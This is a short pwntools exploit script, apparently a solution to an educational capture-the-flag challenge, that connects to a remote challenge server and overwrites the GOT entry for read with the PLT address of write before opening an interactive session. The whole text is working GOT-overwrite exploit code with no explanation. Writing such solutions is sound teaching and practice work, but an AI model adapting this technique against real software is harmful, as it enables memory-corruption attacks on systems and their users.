from pwn import *
s = process('share/chal')
s = remote('edu-ctf.zoolab.org',10004)
context.terminal = ['tmux','splitw','-h']
#gdb.attach(proc.pidof(s)[0])
read_got = 0x404038
write_plt = 0x401030
s.sendlineafter(b"Overwrite addr: ",str(read_got))
s.sendafter(b"Overwrite 8 bytes value: ",p64(write_plt))
s.interactive()
